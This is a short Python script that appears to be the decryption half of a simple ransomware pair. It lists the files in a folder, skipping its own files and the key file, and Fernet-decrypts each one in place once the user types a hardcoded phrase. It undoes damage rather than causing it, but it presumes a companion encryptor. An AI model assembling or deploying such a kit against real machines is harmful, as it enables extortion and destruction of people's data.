import os
from cryptography.fernet import Fernet

# Decryption of files


# Initializing Files List

files = []

# processing files

for file in os.listdir():
    if file == "Encrypt.py":
        continue
    if file == "decrypt.py":
        continue
    if file == 'thekey.key':
        continue
    if os.path.isfile(file):
        files.append(file)
# files output
print(files)

# decryption

# # OPENING KEY

with open("thekey.key", 'rb') as key:
    secretKey = key.read()

# # Initializing Secret Phrase for Decryption

secretPhrase = "help"


# # Secret Phrase Entry

user_entry = input("Enter the secret phrase to decrypt all of your files:\n")

# # MAIN PROCESS

if user_entry == secretPhrase:
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contenst_decrypted = Fernet(secretKey).decrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contenst_decrypted)
        print("your files have been decrypted.")
else:
    print("wrong phrase, try again later")
